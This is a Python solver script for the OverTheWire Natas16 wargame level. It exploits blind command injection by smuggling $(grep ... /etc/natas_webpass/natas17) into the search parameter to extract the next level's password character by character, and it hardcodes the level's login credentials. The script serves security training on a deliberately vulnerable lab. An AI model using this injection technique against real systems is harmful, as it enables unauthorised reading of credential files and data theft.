# Natas16 brute-force script :)
import requests, string, sys, time

# =======================
# === STYLING HELPERS ===
# =======================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def log_info(message):
    print(f"{CYAN}[*] {message}{RESET}")

def log_step(message):
    print(f"{YELLOW}[*] {message}{RESET}")

def log_success(message):
    print(f"{GREEN}[+] {message}{RESET}")

def log_progress_inline(message, color=CYAN):
    sys.stdout.write(f"\r{color}{message}{RESET}")
    sys.stdout.flush()

def log_found_inline(message):
    sys.stdout.write(f"\r{GREEN}{message}{RESET}\n")
    sys.stdout.flush()

def log_final_password(password):
    print(f"\n{GREEN}[✔] Password for natas17: {CYAN}{password}{RESET}")

def pause_short():
    time.sleep(0.05)
# =======================

# === CONFIG ===
url = "http://natas16.natas.labs.overthewire.org/"
authUsername = "natas16"
authPassword = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
charData = string.ascii_letters + string.digits
# ==============

matchingCharData = ""

# === Step 1: Find valid characters ===
log_info("Starting Natas16 brute force...")
log_step(f"Testing {len(charData)} possible characters...\n")

for idx, i in enumerate(charData, 1):
    injection = f"$(grep {i} /etc/natas_webpass/natas17)squid"
    tempUrl = f"{url}?needle={injection}&submit=Search"

    log_progress_inline(f"Testing char {idx}/{len(charData)}: '{i}'...")

    response = requests.get(tempUrl, auth=(authUsername, authPassword))

    if 'squid' not in response.text:
        log_found_inline(f"Valid character found: '{i}'")
        matchingCharData += i
        pause_short()

log_step(f"Possible password characters: {matchingCharData}")
# =====================================

# === Step 2: Brute-force password order ===
password = ""
log_info("Starting ordered brute-force...")

while len(password) < 32:
    for char in matchingCharData:
        attempt = password + char
        injection = f"$(grep ^{attempt} /etc/natas_webpass/natas17)squid"
        tempUrl = f"{url}?needle={injection}&submit=Search"

        log_progress_inline(f"Trying: {attempt:<32}")

        response = requests.get(tempUrl, auth=(authUsername, authPassword))

        if 'squid' not in response.text:
            password += char
            log_found_inline(f"Password so far: {password:<32}")
            pause_short()
            break

log_final_password(password)
# ==========================================